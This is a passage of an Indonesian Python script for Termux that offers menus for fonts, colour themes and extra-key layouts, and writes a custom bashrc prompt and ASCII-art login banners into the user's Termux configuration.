			list_menu = [f"• Fira Code Bold Nerd Font                  {hx3}{pp} (01) {px}", f"• Fira Code Medium Nerd Font Complete Mono  {hx3}{pp} (02) {px}", f"• JetBrains Mono Bold Nerd Font Complete    {hx3}{pp} (03) {px}", f"• JetBrains Mono Medium Nerd Font Complete  {hx3}{pp} (04) {px}", f"• MesloLGS NF Bold Italic                   {hx3}{pp} (05) {px}", f"• MesloLGS NF Bold                          {hx3}{pp} (06) {px}", f"• MesloLGS NF Italic                        {hx3}{pp} (07) {px}", f"• MesloLGS NF Regular                       {hx3}{pp} (08) {px}", f"• Ubah Ke Tampilan Default                  {hx3}{pp} (09) {px}", f"\r", f"• Kembali ke Menu Awal                      {hx3}{pp} (10) {px}", f"• Keluar                                    {hx3}{pp} (11) {px}"]
			menu = [inquirer.List("sanz", choices = list_menu, carousel = True, message = f"{hx2}")]

			class sanz_ganz(Default):
				def __init__(self):
					super().__init__()
					self.Question.mark_color = f"{hx2}"
					self.Question.brackets_color = f"{hx2}"
					self.List.selection_cursor = f"{m}⩥ {pp}{p}"

			sanz = inquirer.prompt(menu, theme=sanz_ganz())
			sanz = str(sanz);print(B);sleep(1)
			if "(01)" in sanz: self.set_font(0)
			elif "(02)" in sanz: self.set_font(1)
			elif "(03)" in sanz: self.set_font(2)
			elif "(04)" in sanz: self.set_font(3)
			elif "(05)" in sanz: self.set_font(4)
			elif "(06)" in sanz: self.set_font(5)
			elif "(07)" in sanz: self.set_font(6)
			elif "(08)" in sanz: self.set_font(7)
			elif "(09)" in sanz:
				animasi().banner()
				os.system(f"rm {path3}/font.ttf &> /dev/null")
				sleep(1)
				animasi().loading("Proses mengubah font termux ke default, tunggu..")
				animasi().jeda2()
				sleep(3)
				print(f" {m}➤ {p}Font termux default berhasil terpasang {k}[ {h}✓ {k}]")
				sleep(2);os.system("termux-reload-settings")
				exit()
			elif "(10)" in sanz: more_tools()
			elif "(11)" in sanz: hapus();exit(f"\n {m}➤ {p}Makasih Ngab, Jgn Lupa Balik Lagi{m}..\n")
			elif "None" in sanz: print(C);hapus();print(f" {m}➤ {p}Program Dihentikan\n\n");print(C)
			else:
				pass

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Koneksi Internet Error\n")
		except KeyError:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Server Error\n {m}➤ {p}Silahkan Coba Lagi{m}..\n")
		except json.decoder.JSONDecodeError:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Server Error\n {m}➤ {p}Silahkan Coba Lagi{m}..\n")
		except Exception as lol:
			to=f"\n {m}➤ {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def theme(self):
		try:
			A = "\x1b[1A"
			B = "\x1b[2A"
			C = "\x1b[3A"

			animasi().banner()
			print(f" {m}➤ {p}Gunakan tombol arah atas/bawah {h}↑{k}↓")

			import inquirer
			from inquirer.themes import Default

			list_menu = [f"• ayu-dark                   {hx3}{pp} (01) {px}", f"• ayu-light                  {hx3}{pp} (02) {px}", f"• ayu-mirage                 {hx3}{pp} (03) {px}", f"• catppuccin                 {hx3}{pp} (04) {px}", f"• dracula                    {hx3}{pp} (05) {px}", f"• elementary                 {hx3}{pp} (06) {px}", f"• everblush                  {hx3}{pp} (07) {px}", f"• flat                       {hx3}{pp} (08) {px}", f"• gruvbox-dark               {hx3}{pp} (09) {px}", f"• material-ocean             {hx3}{pp} (10) {px}", f"• material                   {hx3}{pp} (11) {px}", f"• monokai-dark               {hx3}{pp} (12) {px}", f"• nekonako-djancoeg          {hx3}{pp} (13) {px}", f"• nekonako-hue               {hx3}{pp} (14) {px}", f"• nekonako-om-mar            {hx3}{pp} (15) {px}", f"• one-dark                   {hx3}{pp} (16) {px}", f"• owl4ce-dark                {hx3}{pp} (17) {px}", f"• owl4ce-light               {hx3}{pp} (18) {px}", f"• siduck-onedark             {hx3}{pp} (19) {px}", f"• snazzy                     {hx3}{pp} (20) {px}", f"• tomorrow-night             {hx3}{pp} (21) {px}", f"• tomorrow-night.eighties    {hx3}{pp} (22) {px}", f"• Ubah Ke Tampilan Default   {hx3}{pp} (23) {px}", f"\r", f"• Kembali ke Menu Awal       {hx3}{pp} (24) {px}", f"• Keluar                     {hx3}{pp} (25) {px}"]
			menu = [inquirer.List("sanz", choices = list_menu, carousel = True, message = f"{hx2}")]

			class sanz_ganz(Default):
				def __init__(self):
					super().__init__()
					self.Question.mark_color = f"{hx2}"
					self.Question.brackets_color = f"{hx2}"
					self.List.selection_cursor = f"{m}⩥ {pp}{p}"

			sanz = inquirer.prompt(menu, theme=sanz_ganz())
			sanz = str(sanz);print(B);sleep(1)
			if "(01)" in sanz: self.set_theme(0)
			elif "(02)" in sanz: self.set_theme(1)
			elif "(03)" in sanz: self.set_theme(2)
			elif "(04)" in sanz: self.set_theme(3)
			elif "(05)" in sanz: self.set_theme(4)
			elif "(06)" in sanz: self.set_theme(5)
			elif "(07)" in sanz: self.set_theme(6)
			elif "(08)" in sanz: self.set_theme(7)
			elif "(09)" in sanz: self.set_theme(8)
			elif "(10)" in sanz: self.set_theme(9)
			elif "(11)" in sanz: self.set_theme(10)
			elif "(12)" in sanz: self.set_theme(11)
			elif "(13)" in sanz: self.set_theme(12)
			elif "(14)" in sanz: self.set_theme(13)
			elif "(15)" in sanz: self.set_theme(14)
			elif "(16)" in sanz: self.set_theme(15)
			elif "(17)" in sanz: self.set_theme(16)
			elif "(18)" in sanz: self.set_theme(17)
			elif "(19)" in sanz: self.set_theme(18)
			elif "(20)" in sanz: self.set_theme(19)
			elif "(21)" in sanz: self.set_theme(20)
			elif "(22)" in sanz: self.set_theme(21)
			elif "(23)" in sanz:
				animasi().banner()
				os.system(f"rm {path3}/colors.properties &> /dev/null")
				sleep(1)
				animasi().loading("Proses mengubah warna background termux ke default, tunggu..")
				animasi().jeda2()
				sleep(3)
				print(f" {m}➤ {p}Warna background termux default berhasil terpasang {k}[ {h}✓ {k}]")
				sleep(2);os.system("termux-reload-settings")
				exit()
			elif "(24)" in sanz: more_tools()
			elif "(25)" in sanz: hapus();exit(f"\n {m}➤ {p}Makasih Ngab, Jgn Lupa Balik Lagi{m}..\n")
			elif "None" in sanz: print(C);hapus();print(f" {m}➤ {p}Program Dihentikan\n\n");print(C)
			else:
				pass

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Koneksi Internet Error\n")
		except KeyError:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Server Error\n {m}➤ {p}Silahkan Coba Lagi{m}..\n")
		except json.decoder.JSONDecodeError:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Server Error\n {m}➤ {p}Silahkan Coba Lagi{m}..\n")
		except Exception as lol:
			to=f"\n {m}➤ {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def tombol(self):
		tombol_old = "extra-keys = [ \\\n    ['ESC', 'TAB', 'CTRL', 'ALT', {key: '-', popup: '|'}, 'DOWN', 'UP'] \\\n]"
		tombol_def = "extra-keys = [ \\\n    ['ESC','/','-','HOME','UP','END','PGUP'], \\\n    ['TAB','CTRL','ALT','LEFT','DOWN','RIGHT','PGDN'] \\\n]"
		tombol_ful = "extra-keys = [ \\\n    ['F1','F2','F3','F4','F5','F6','F7'], \\\n    ['ESC','/','-','HOME','UP','END','PGUP'], \\\n    ['TAB','CTRL','ALT','LEFT','DOWN','RIGHT','PGDN'] \\\n]"
		tombol_cus = "extra-keys = [ \\\n    ['F1' , 'ESC', 'CTRL', 'ALT', 'TAB', {key: KEYBOARD, popup: DRAWER}, 'HOME', 'UP', 'END'], \\\n    ['DELETE', '{}', '()', '[]', '$', 'BACKSLASH', 'LEFT', 'DOWN', 'RIGHT'] \\\n]"
		try:
			A = "\x1b[1A"
			B = "\x1b[2A"
			C = "\x1b[3A"

			animasi().banner()
			print(f" {m}➤ {p}Gunakan tombol arah atas/bawah {h}↑{k}↓")

			import inquirer
			from inquirer.themes import Default

			list_menu = [f"• Tombol Navigasi Termux Old       {hx3}{pp} (01) {px}", f"• Tombol Navigasi Termux Default   {hx3}{pp} (02) {px}", f"• Tombol Navigasi Termux Full      {hx3}{pp} (03) {px}", f"• Tombol Navigasi Termux Custom    {hx3}{pp} (04) {px}", f"• Edit Tombol Navigasi Termux      {hx3}{pp} (05) {px}", f"\r", f"• Kembali Ke Menu Awal             {hx3}{pp} (06) {px}", f"• Keluar                           {hx3}{pp} (07) {px}"]
			menu = [inquirer.List("sanz", choices = list_menu, carousel = True, message = f"{hx2}")]

			class sanz_ganz(Default):
				def __init__(self):
					super().__init__()
					self.Question.mark_color = f"{hx2}"
					self.Question.brackets_color = f"{hx2}"
					self.List.selection_cursor = f"{m}⩥ {pp}{p}"

			sanz = inquirer.prompt(menu, theme=sanz_ganz())
			sanz = str(sanz);print(B);sleep(1)
			if "(01)" in sanz: self.set_tombol(tombol_old)
			elif "(02)" in sanz: self.set_tombol(tombol_def)
			elif "(03)" in sanz: self.set_tombol(tombol_ful)
			elif "(04)" in sanz: self.set_tombol(tombol_cus)
			elif "(05)" in sanz: os.system(f"nano {path3}/termux.properties");theme_ft().tombol()
			elif "(06)" in sanz: more_tools()
			elif "(07)" in sanz: hapus();exit(f"\n {m}➤ {p}Makasih Ngab, Jgn Lupa Balik Lagi{m}..\n")
			elif "None" in sanz: print(C);hapus();print(f" {m}➤ {p}Program Dihentikan\n\n");print(C)
			else:
				pass

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Koneksi Internet Error\n")
		except KeyError:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Server Error\n {m}➤ {p}Silahkan Coba Lagi{m}..\n")
		except json.decoder.JSONDecodeError:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Server Error\n {m}➤ {p}Silahkan Coba Lagi{m}..\n")
		except Exception as lol:
			to=f"\n {m}➤ {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

class sanz_tampilan:
	def __init__(self):
		try:
			user = open(f"{path}/{file}","r").read()
			___user___ = json.loads(user)["data"]["token"]
		except:
			clear()
			hapus_file(path+"/"+file);hapus();sleep(0.5)
			exit(f"{km} {k}Token sudah expired, silahkan login lagi ya{m}..\n")
		pass

	def cek(self):
		os.system("cd $HOME")
		os.system("login")
		exit()

	def set_theme(self,prompt):
		sanz = open("Data/bash.bashrc", "w")
		sanz.write("# Command history tweaks:")
		sanz.write("\n# - Append history instead of overwriting")
		sanz.write("\n#   when shell exits.")
		sanz.write("\n# - When using history substitution, do not")
		sanz.write("\n#   exec command immediately.")
		sanz.write("\n# - Do not save to history commands starting")
		sanz.write("\n#   with space.")
		sanz.write("\n# - Do not save duplicated commands.")
		sanz.write("\n\n# Powered by Sanz")
		sanz.write("\n# Youtube : FREE TUTORIAL")
		sanz.write("\n# Github  : https://github.com/Sxp-ID")
		sanz.write("\n\nshopt -s histappend")
		sanz.write("\nshopt -s histverify")
		sanz.write("\nexport HISTCONTROL=ignoreboth")
		sanz.write("\n\n# Running Theme-Me")
		sanz.write("\ncd $HOME")
		sanz.write("\nbash /data/data/com.termux/files/sanz/sanz-banner.sh")
		sanz.write("\n\n# Default command line prompt.")
		sanz.write("\nPROMPT_DIRTRIM=2")
		sanz.write("\n#PS1='\[\e[0;32m\]\w\[\e[0m\] \[\e[0;97m\]\$\[\e[0m\] '")
		sanz.write(f"\nPS1='\[\033[0;31m\]┌─[\[\033[1;34m\]{prompt}\[\033[1;33m\]@\[\033[1;36m\]termux\[\033[0;31m\]]─[\[\033[0;32m\]\w\[\033[0;31m\]]\n\[\033[0;31m\]└──╼ \[\e[1;31m\]❯\[\e[1;34m\]❯\[\e[0;37m\]❯\[\033[0m\] '")
		sanz.write("\n# Udah tinggal pake aja")
		sanz.write("\n\n# Handles nonexistent commands.")
		sanz.write("\n# If user has entered command which invokes non-available")
		sanz.write("\n# utility, command-not-found will give a package suggestions.")
		sanz.write("\nif [ -x /data/data/com.termux/files/usr/libexec/termux/command-not-found ]; then")
		sanz.write("\n	command_not_found_handle() {")
		sanz.write('\n		/data/data/com.termux/files/usr/libexec/termux/command-not-found "$1"')
		sanz.write("\n	}")
		sanz.write("\nfi")
		sanz.write("\n\n[ -r /data/data/com.termux/files/usr/share/bash-completion/bash_completion ] && . /data/data/com.termux/files/usr/share/bash-completion/bash_completion")
		sanz.close()

	def custom_name(self):
		animasi().banner()
		sleep(0.5);print(f" {m}➤ {p}Masukan Nama Untuk Dibagian Logo/Banner")
		nama_logo = input(f"           {hx}Sanz \r {h}• {p}Input {m}: {h}");animasi().jeda()
		if nama_logo[7:] == "":
			ukuran = open("Data/index","r").read().split()[0]
			pass
		else:
			print(f"\n {m}➤ {p}Jumlah Karakter Nama Terlalu Banyak Ngab, Max 7 Huruf !\n")
			sleep(5);self.custom_name()

		print(f" {m}➤ {p}Masukan Nama Untuk Dibagian Author")
		nama = input(f"           {hx}Sanz \r {h}• {p}Input {m}: {h}")
		animasi().jeda()
		print(f" {m}➤ {p}Masukan Nama Untuk Dibagian Prompt")
		prompt = input(f"           {hx}Sanz \r {h}• {p}Input {m}: {h}")
		animasi().load()
		animasi().loading("Proses merubah tampilan, tunggu..")
		animasi().jeda2()
		sanz = open("Data/sanz-banner.sh", "w")
		sanz.write("#!/usr/bin/bash")
		sanz.write("\n\n# Powered by Sanz")
		sanz.write("\n# Youtube : FREE TUTORIAL")
		sanz.write("\n# Github  : https://github.com/Sxp-ID")
		sanz.write("\n\nclear")
		sanz.write("\nsleep 2.1")
		sanz.write('\n\nPUT(){ echo -en "\033[${1};${2}H";}')
		sanz.write('\nDRAW(){ echo -en "\033%";echo -en "\033(0";}')
		sanz.write('\nWRITE(){ echo -en "\033(B";}')
		sanz.write('\nHIDECURSOR(){ echo -en "\033[?25l";}')
		sanz.write('\nNORM(){ echo -en "\033[?12l\033[?25h";}')
		sanz.write("\nHIDECURSOR")
		sanz.write("\nclear")
		sanz.write('\necho -e "\033[34;1m"')
		sanz.write('\necho "┌──────────────────────────────────────────────────────────────┐"')
		sanz.write("\nfor ((i=1; i<=8; i++)); do")
		sanz.write('\necho "│                                                              │"')
		sanz.write("\ndone")
		sanz.write('\necho "└──────────────────────────────────────────────────────────────┘"')
		sanz.write("\nPUT 4 0")
		sanz.write('\nprintf "\033[1;32m"')
		sanz.write(f'\nfiglet -c -f /data/data/com.termux/files/sanz/ASCII-Shadow -w {ukuran} "{nama_logo}"')
		sanz.write('\nPUT 3 0')
		sanz.write('\necho -e "\033[34;1m"')
		sanz.write("\nfor ((i=1; i<=7; i++)); do")
		sanz.write('\necho "│"')
		sanz.write("\ndone")
		sanz.write("\nPUT 10 47")
		sanz.write(f'\necho -e "\033[0;37mWelcome \033[0;33m{nama}\033[0m"')
		sanz.write("\nPUT 12 0")
		sanz.write("\nNORM")
		sanz.write("\necho ''")
		sanz.write("\n# Udah tinggal pake aja")
		sanz.close()
		self.set_theme(prompt)
		os.system(f"rm {path4} &> /dev/null")
		os.system(f"rm {path5} &> /dev/null")
		os.system(f"cp Data/fonts/ASCII-Shadow.flf {path2}")
		os.system(f"mv Data/sanz-banner.sh {path2} && mv Data/bash.bashrc {path5}")
		os.system(f"touch Data/sanz-banner.sh && touch Data/bash.bashrc")
		print(f" {m}➤ {p}Tampilan termux berhasil terpasang {k}[ {h}✓ {k}]")
		animasi().jeda()
		input(f" {m}➤ {p}Klik enter untuk melihat hasil nya.. ");sleep(2)
		self.cek()

	def redskull(self):
		animasi().banner()
		sleep(0.5);print(f" {m}➤ {p}Masukan Nama Untuk Dibagian Author")
		nama = input(f"           {hx}Sanz \r {h}• {p}Input {m}: {h}")
		animasi().jeda()
		print(f" {m}➤ {p}Masukan Nama Untuk Dibagian Prompt")
		prompt = input(f"           {hx}Sanz \r {h}• {p}Input {m}: {h}")
		animasi().load()
		animasi().loading("Proses merubah tampilan, tunggu..")
		animasi().jeda2()
		sanz = open("Data/sanz-banner.sh", "w")
		sanz.write("\n# Powered by Sanz")
		sanz.write("\n# Youtube : FREE TUTORIAL")
		sanz.write("\n# Github  : https://github.com/Sxp-ID")
		sanz.write("\n\nclear")
		sanz.write("\nsleep 2.1")
		sanz.write("\necho '\033[1;31m        @@@@@                                        @@@@@'")
		sanz.write("\necho '\033[1;31m       @@@@@@@                                      @@@@@@@'")
		sanz.write("\necho '\033[1;31m       @@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@'")
		sanz.write("\necho '\033[1;31m        @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@'")
		sanz.write("\necho '\033[1;31m            @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@'")
		sanz.write("\necho '\033[1;31m              @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@'")
		sanz.write("\necho '\033[1;31m                @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@'")
		sanz.write("\necho '\033[1;31m                   @@@@@@@    @@@@@@    @@@@@@'")
		sanz.write("\necho '\033[1;31m                   @@@@@@      @@@@      @@@@@'")
		sanz.write("\necho '\033[1;31m                   @@@@@@      @@@@      @@@@@'")
		sanz.write("\necho '\033[1;31m                    @@@@@@    @@@@@@    @@@@@'")
		sanz.write("\necho '\033[1;31m                     @@@@@@@@@@@  @@@@@@@@@@'")
		sanz.write("\necho '\033[1;31m                      @@@@@@@@@@  @@@@@@@@@'")
		sanz.write("\necho '\033[1;31m                   @@   @@@@@@@@@@@@@@@@@   @@'")
		sanz.write("\necho '\033[1;31m                  @@@@  @@@@ @ @ @ @ @@@@  @@@@'")
		sanz.write("\necho '\033[1;31m                 @@@@@   @@@ @ @ @ @ @@@   @@@@@'")
		sanz.write("\necho '\033[1;31m               @@@@@      @@@@@@@@@@@@@      @@@@@'")
		sanz.write("\necho '\033[1;31m             @@@@          @@@@@@@@@@@          @@@@'")
		sanz.write("\necho '\033[1;31m          @@@@@              @@@@@@@              @@@@@'")
		sanz.write("\necho '\033[1;31m         @@@@@@@                                 @@@@@@@'")
		sanz.write("\necho '\033[1;31m          @@@@@                                   @@@@@ '")
		sanz.write(f"\necho '\033[0m                       =[ \033[1;33mCoded by {nama} \033[0m]='")
		sanz.write(f"\necho '\033[0m          +  --  --=[ \033[1;32mUser Termux {sanz_negara} \033[0m]=--  --  +'")
		sanz.write("\necho ''")
		sanz.write("\n# Udah tinggal pake aja")
		sanz.close()
		self.set_theme(prompt)
		os.system(f"rm {path4} &> /dev/null")
		os.system(f"rm {path5} &> /dev/null")
		os.system(f"mv Data/sanz-banner.sh {path2} && mv Data/bash.bashrc {path5}")
		os.system(f"touch Data/sanz-banner.sh && touch Data/bash.bashrc")
		print(f" {m}➤ {p}Tampilan termux berhasil terpasang {k}[ {h}✓ {k}]")
		animasi().jeda()
		input(f" {m}➤ {p}Klik enter untuk melihat hasil nya.. ");sleep(2)
		self.cek()

	def naga(self):
		animasi().banner()
		sleep(0.5);print(f" {m}➤ {p}Masukan Nama Untuk Dibagian Author")
		nama = input(f"           {hx}Sanz \r {h}• {p}Input {m}: {h}")
		animasi().jeda()
		print(f" {m}➤ {p}Masukan Nama Untuk Dibagian Prompt")
		prompt = input(f"           {hx}Sanz \r {h}• {p}Input {m}: {h}")
		animasi().load()
		animasi().loading("Proses merubah tampilan, tunggu..")
		animasi().jeda2()
		sanz = open("Data/sanz-banner.sh", "w")
		sanz.write("\n# Powered by Sanz")
		sanz.write("\n# Youtube : FREE TUTORIAL")
		sanz.write("\n# Github  : https://github.com/Sxp-ID")
		sanz.write("\n\nclear")
		sanz.write("\nsleep 2.1")
		sanz.write("\necho")
		sanz.write("\necho '\033[95m                     ______________'")
		sanz.write("\necho '                ,===:.,            `-._'")
		sanz.write("\necho '                `:.`---.__         `-._'")
		sanz.write("\necho '                  `:.     `--.         `.'")
		sanz.write("\necho '                    \.        `.         `.'")
		sanz.write("\necho '            (,,(,    \.         `.   ____,-`.,'")
		sanz.write("\necho '         (,      `/   \.   ,--.___`.'")
		sanz.write("\necho '     ,  ,  ,--.   `,   \. ;`'")
		sanz.write("\necho '      `{\033[91mD\033[95m,{     \  :    \ ;  '")
		sanz.write("\necho ' \033[95m       V,,     /  /    //'")
		sanz.write("\necho '        j;;    /  ,  ,-//.    ,---.      ,'")
		sanz.write("\necho '        \;    /  ,  /  _  \  /  _  \   , /'")
		sanz.write("\necho '              \   `   / \  `   / \  `.  /'")
		sanz.write("\necho '               `.___,/   `.__,/   `.__,/'")
		sanz.write("\necho ''")
		sanz.write("\necho '\033[0m         =[ \033[1;33mCoded by "+ nama +"'")
		sanz.write("\necho '\033[0m+  --  --=[ \033[1;32mUser Termux \033[1;31mIndo\033[1;37mnesia'")
		sanz.write("\necho ''")
		sanz.write("\n# Udah tinggal pake aja")
		sanz.close()
		self.set_theme(prompt)
		os.system(f"rm {path4} &> /dev/null")
		os.system(f"rm {path5} &> /dev/null")
		os.system(f"mv Data/sanz-banner.sh {path2} && mv Data/bash.bashrc {path5}")
		os.system(f"touch Data/sanz-banner.sh && touch Data/bash.bashrc")
		print(f" {m}➤ {p}Tampilan termux berhasil terpasang {k}[ {h}✓ {k}]")
		animasi().jeda()
		input(f" {m}➤ {p}Klik enter untuk melihat hasil nya.. ");sleep(2)
		self.cek()

	def termux(self):
		animasi().banner()
		sleep(0.5);print(f" {m}➤ {p}Masukan Nama Untuk Dibagian Author")
		nama = input(f"           {hx}Sanz \r {h}• {p}Input {m}: {h}")
		animasi().jeda()
		print(f" {m}➤ {p}Masukan Nama Untuk Dibagian Prompt")
		prompt = input(f"           {hx}Sanz \r {h}• {p}Input {m}: {h}")
		animasi().load()
		animasi().loading("Proses merubah tampilan, tunggu..")
		animasi().jeda2()
		sanz = open("Data/sanz-banner.sh", "w")
		sanz.write("\n# Powered by Sanz")
		sanz.write("\n# Youtube : FREE TUTORIAL")
		sanz.write("\n# Github  : https://github.com/Sxp-ID")
		sanz.write("\n\nclear")
		sanz.write("\nsleep 2.1")
		sanz.write("\necho '\033[31m      ████████ ███████ ██████  ███    ███ ██    ██ ██   ██ '")
		sanz.write("\necho '         ██    ██      ██   ██ ████  ████ ██    ██  ██ ██  '")
		sanz.write("\necho '         ██    █████   ██████  ██ ████ ██ ██    ██   ███   '")
		sanz.write("\necho '         ██    ██      ██   ██ ██  ██  ██ ██    ██  ██ ██  '")
		sanz.write("\necho '         ██    ███████ ██   ██ ██      ██  ██████  ██   ██ '")
		sanz.write("\necho '\033[0m                      =[ \033[1;33mCoded by "+nama+" \033[0m]='")
		sanz.write("\necho '\033[0m         +  --  --=[ \033[1;32mUser Termux \033[1;31mIndo\033[1;37mnesia \033[0m]=--  --  +'")
		sanz.write("\necho ''")
		sanz.write("\n# Udah tinggal pake aja")
		sanz.close()
		self.set_theme(prompt)
		os.system(f"rm {path4} &> /dev/null")
		os.system(f"rm {path5} &> /dev/null")
		os.system(f"mv Data/sanz-banner.sh {path2} && mv Data/bash.bashrc {path5}")
		os.system(f"touch Data/sanz-banner.sh && touch Data/bash.bashrc")
		print(f" {m}➤ {p}Tampilan termux berhasil terpasang {k}[ {h}✓ {k}]")
		animasi().jeda()
		input(f" {m}➤ {p}Klik enter untuk melihat hasil nya.. ");sleep(2)
		self.cek()

	def tengkorak(self):
		animasi().banner()
		sleep(0.5);print(f" {m}➤ {p}Masukan Nama Untuk Dibagian Author")
		nama = input(f"           {hx}Sanz \r {h}• {p}Input {m}: {h}")
		animasi().jeda()
		print(f" {m}➤ {p}Masukan Nama Untuk Dibagian Prompt")
		prompt = input(f"           {hx}Sanz \r {h}• {p}Input {m}: {h}")
		animasi().load()
		animasi().loading("Proses merubah tampilan, tunggu..")
		animasi().jeda2()
		sanz = open("Data/sanz-banner.sh", "w")
		sanz.write("\n# Powered by Sanz")
		sanz.write("\n# Youtube : FREE TUTORIAL")
		sanz.write("\n# Github  : https://github.com/Sxp-ID")
		sanz.write("\n\nclear")
		sanz.write("\nsleep 2.1")
		sanz.write("\necho '\033[91m                       .:::!~!!!!!:.'")
		sanz.write("\necho '                    .xUHWH!! !!?M88WHX:.'")
		sanz.write("\necho '                  .X*#M@&!!  !X!M&&&&&&WWx:.'")
		sanz.write("\necho '                 :!!!!!!?H! :!&!&&&&&&&&&&8X:'")
		sanz.write("\necho '                !!~  ~:~!! :~!&!#&&&&&&&&&&8X:'")
		sanz.write("\necho '               :!~::!H!<   ~.U&X!?R&&&&&&&&MM!'")
		sanz.write("\necho '               ~!~!!!!~~ .:XW&&&U!!?&&&&&&RMM!'")
		sanz.write("\necho '                 !:~~~ .:!MST#&&&&WX??#MRRMMM!'")
		sanz.write("\necho '                 ~?WuxiW*`   `√#&&&&8!!!!??!!!'")
		sanz.write("\necho '               :X- M&&&&       `rT#&T~!8&WUXU~'")
		sanz.write("\necho '              :%`  ~#&&&m:    \033[95m✪   \033[91m~!~ ?&&&&&&'")
		sanz.write("\necho '            :!`.-   ~T&&&&8xx.  .xWW- ~x&&&&&'")
		sanz.write("\necho ' .......   -~~:<` !    ~?T#&&@@W@*?&&   \033[95m✪  \033[91m/`'")
		sanz.write("\necho '\033[90mG \033[91m|W&@@M!!! .!~~ !!     .:XUW&W!~ `&~:    :'")
		sanz.write("\necho '\033[90mH \033[91m|#&~~`.:x%`!!  !H:   !WM&&&&Ti.: .!WUn+!`'")
		sanz.write("\necho '\033[90mO \033[91m|:::~:!!`:X~ .: ?H.!u °&&&B&&&!W:U!T&&M~'")
		sanz.write("\necho '\033[90mS \033[91m|.~~   :X@!.-~   ?@WTWo(`*&&&W&TH&! `'")
		sanz.write("\necho '\033[90mT \033[91m|Wi.~!X$?!-~    / ?&&&B&Wu(`**&RM!'")
		sanz.write("\necho ' .......         /   ~&&&&&B&&en:``'")
		sanz.write("\necho '\033[91m                     ~`##*&&&&M~'")
		sanz.write("\necho ''")
		sanz.write("\necho '\033[0m         =[ \033[1;33mCoded by "+ nama +"'")
		sanz.write("\necho '\033[0m+  --  --=[ \033[1;32mUser Termux \033[1;31mIndo\033[1;37mnesia'")
		sanz.write("\necho ''")
		sanz.write("\n# Udah tinggal pake aja")
		sanz.close()
		self.set_theme(prompt)
		os.system(f"rm {path4} &> /dev/null")
		os.system(f"rm {path5} &> /dev/null")
		os.system(f"mv Data/sanz-banner.sh {path2} && mv Data/bash.bashrc {path5}")
		os.system(f"touch Data/sanz-banner.sh && touch Data/bash.bashrc")
		print(f" {m}➤ {p}Tampilan termux berhasil terpasang {k}[ {h}✓ {k}]")
		animasi().jeda()
		input(f" {m}➤ {p}Klik enter untuk melihat hasil nya.. ");sleep(2)
		self.cek()

	def blackhat_v1(self):
		animasi().banner()
		sleep(0.5);print(f" {m}➤ {p}Masukan Nama Untuk Dibagian Author")
		nama = input(f"           {hx}Sanz \r {h}• {p}Input {m}: {h}")
		animasi().jeda()
		print(f" {m}➤ {p}Masukan Nama Untuk Dibagian Prompt")
		prompt = input(f"           {hx}Sanz \r {h}• {p}Input {m}: {h}")
		animasi().load()
		animasi().loading("Proses merubah tampilan, tunggu..")
		animasi().jeda2()
		sanz = open("Data/sanz-banner.sh", "w")
		sanz.write("\n# Powered by Sanz")
		sanz.write("\n# Youtube : FREE TUTORIAL")
		sanz.write("\n# Github  : https://github.com/Sxp-ID")
		sanz.write("\n\nclear")
		sanz.write("\nsleep 2.1")
		sanz.write("\necho '\033[92m     ▄▄▄▄    ██▓    ▄▄▄       ▄████▄   ██ ▄█▀    ██░ ██  ▄▄▄     ▄▄▄█████▓'")
		sanz.write("\necho '\033[92m    ▓█████▄ ▓██▒   ▒████▄    ▒██▀ ▀█   ██▄█▒    ▓██░ ██▒▒████▄   ▓  ██▒ ▓▒'")
		sanz.write("\necho '\033[92m    ▒██▒ ▄██▒██░   ▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▒██▀▀██░▒██  ▀█▄ ▒ ▓██░ ▒░'")
		sanz.write("\necho '\033[92m    ▒██░█▀  ▒██░   ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ░▓█ ░██ ░██▄▄▄▄██░ ▓██▓ ░ '")
		sanz.write("\necho '\033[92m    ░▓█  ▀█▓░██████▒▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ░▓█▒░██▓ ▓█   ▓██▒ ▒██▒ ░ '")
		sanz.write("\necho '\033[92m    ░▒▓███▀▒░ ▒░▓  ░▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒    ▒ ░░▒░▒ ▒▒   ▓▒█░ ▒ ░░   '")
		sanz.write("\necho '\033[92m    ▒░▒   ░ ░ ░ ▒  ░ ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░    ▒ ░▒░ ░  ▒   ▒▒ ░   ░    '")
		sanz.write("\necho ' \033[92m    ░    ░   ░ ░    ░   ▒   ░        ░ ░░ ░     ░  ░░ ░  ░   ▒    ░ '")
		sanz.write("\necho ' \033[90m    ░          ░  ░         \033[0m=[ \033[1;33mCoded by "+nama+" \033[0m]=      ░  ░  ░     ░ '")
		sanz.write("\necho '\033[0m                +  --  --=[ \033[1;32mUser Termux \033[1;31mIndo\033[1;37mnesia \033[0m]=--  --  +'")
		sanz.write("\necho ''")
		sanz.write("\n# Udah tinggal pake aja")
		sanz.close()
		self.set_theme(prompt)
